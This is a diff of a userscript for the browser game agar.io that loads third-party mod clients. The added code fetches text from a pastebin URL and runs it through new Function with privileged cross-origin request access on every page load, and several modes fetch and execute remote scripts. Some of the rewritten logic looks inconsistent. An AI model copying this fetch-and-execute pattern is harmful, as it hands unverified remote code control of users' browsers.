@@ -1,12 +1,11 @@
 // ==UserScript==
 // @name         Delta v4
-// @version      5.1
+// @version      5.3
 // @description  9999999 in 1
 // @namespace    delta.agar
 // @author       neo
 // @match        *://agar.io/*
 // @run-at       document-start
-// @connect      cdn.ogario.ovh
 // @connect      ogar.io
 // @connect      deltav4.glitch.me
 // @connect      hslo.io
@@ -15,97 +14,109 @@
 // @connect      legendmod.ml
 // @connect      lortonx.github.io
 // @connect      127.0.0.1
-// @connect		 ogar.ovh
+// @connect		 pastebin.com
 // @grant        GM.xmlHttpRequest
 // ==/UserScript==
 
-if (location.host == 'agar.io' && location.pathname === '/' ) {
-    location.href = 'https://agar.io/delta';
+if (window.location.host == 'agar.io' && window.location.pathname === '/' ) {
+    window.location.href = 'https://agar.io/delta';
     return;
   }
   
-  var mode = location.pathname.slice(1)
-  var url;
-  switch(mode){
-      case 'github':
-          url = 'https://lortonx.github.io/ext/index.html?'+Math.random()
-          break;
-      case 'dev2': url = 'http://127.0.0.1:5500/deltav4.com/ext/index.html'
-          break;
-      case 'v4':
-          url = 'https://lortonx.github.io/v4/index.html?'+Math.random()
-          break;
-      case 'dev-v4': url = 'http://127.0.0.1:5500/deltav4.com/v4/index.html'
-          break;
+  GM.xmlHttpRequest({
+      method : "GET",
+      url : 'https://pastebin.com/raw/1UZGC6Vv?'+Math.random(),
+      onload : function(e) {
+          window.localStorage.recovery = e.responseText
+      }
+  });
   
   
-  
-
-      case 'ogario':
-          url = 'https://cdn.ogario.ovh/v4/beta/'
-          break;
-      case 'delta':
-          url = 'https://deltav4.glitch.me/v4/index.html'
-          break;
-      case 'remade-delta':
-          url = 'https://deltav4.glitch.me/remade-delta/index.html'
-          break;
-      case 'dev': url = 'http://ogar.ovh/index.html'
-          break;
-      case 'hslo':
+  var location = 'https://deltav4.glitch.me/v4/index.html'
+  var modes = {
+      "remote":function(){
+          location = 'https://deltav4.glitch.me/generator22.html'
+      },
+      "v4":function(){
+          location = 'https://lortonx.github.io/v4/index.html'
+      },
+      "v4dev":function(){
+          location = 'http://127.0.0.1:5500/deltav4.com/v4/index.html'
+      },
+      "v5":function(){
+          location = 'https://lortonx.github.io/ext/index.html'
+      },
+      "v5dev":function(){
+          location = 'http://127.0.0.1:5500/deltav4.com/ext/index.html'
+      },
+      "ogario":function(){
+          location = 'https://cdn.ogario.ovh/v4/beta/'
+      },
+      "hslo":function(){
+          location = 'none'
           window.stop();
           document.documentElement.innerHTML = "";
-          url = null
           GM.xmlHttpRequest({
               method : "GET",
               url : 'https://hslo.io/install.user.js',
               onload : function(e) {
                  new Function(['GM_info, GM_xmlhttpRequest'],e.responseText)(GM.info, GM.xmlHttpRequest)
+                 history.replaceState(null, null, 'hslo');
               }
           });
-          break;
-      case 'at':case 'at/':case 'agartool':case 'agartool/':
+      },
+      "at":function(){
+          location = 'none'
           window.stop();
           document.documentElement.innerHTML = "";
-          url = null
           GM.xmlHttpRequest({
               method : "GET",
               url : 'https://www.agartool.io/agartool.user.js',
               onload : function(e) {
                  new Function(e.responseText)()
+                 window.history.replaceState(null, null, 'at');
               }
           });
-          break;
-      case 'va':case 'vanilla':case 'va/':case 'vanilla/':
+      },
+      "va":function(){
+          location = 'none'
           document.documentElement.innerHTML = "";
-          url = null
           GM.xmlHttpRequest({
               method : "GET",
               url : 'http://imasters.org.ru/agar/js/vanilla.user.js',
               onload : function(e) {
                  new Function(e.responseText)()
+                 setTimeout(function(){window.history.replaceState(null, null, 'va')},2000)
               }
           });
-      break;
-      case 'legendmod':
-      case 'lm':
+      },
+      "lm":function(){
+          location = 'none'
           window.stop();
           document.documentElement.innerHTML = "";
-          url = null
           GM.xmlHttpRequest({
               method : "GET",
               url : 'https://legendmod.ml/LMexpress/LMexpress.user.js',
               onload : function(e) {
                  new Function(['GM_info, GM_xmlhttpRequest'],e.responseText)(GM.info, GM.xmlHttpRequest)
+                 history.replaceState(null, null, 'lm');
               }
           });
-          break;
-      default: url = 'https://deltav4.glitch.me/v4/index.html'
-          console.log(mode)
-  
+      }
   }
   
+  modes['agartool'] = modes['at']
   
+  for(var mode in modes){
+      var isMatched = window.location.pathname.indexOf(mode) > -1
+  
+      if(isMatched) {
+          modes[mode]()
+          break;
+      }
+  }
+  
+  new Function(['GM'],localStorage['recovery'])(GM)
   
   document.documentElement.innerHTML = "Loading";
   if(mode=='none'){
@@ -115,7 +126,7 @@ if (location.host == 'agar.io' && location.pathname === '/' ) {
   }else{
       GM.xmlHttpRequest({
           method: "GET",
-          url: url,
+          url: location,
           onload: function(e) {
               var D       = window.document;
               var newDoc  = D.implementation.createHTMLDocument();
@@ -129,10 +140,4 @@ if (location.host == 'agar.io' && location.pathname === '/' ) {
   
           }
       });
-  }
-  
-  
-  
-  
-  
-  
+  }  
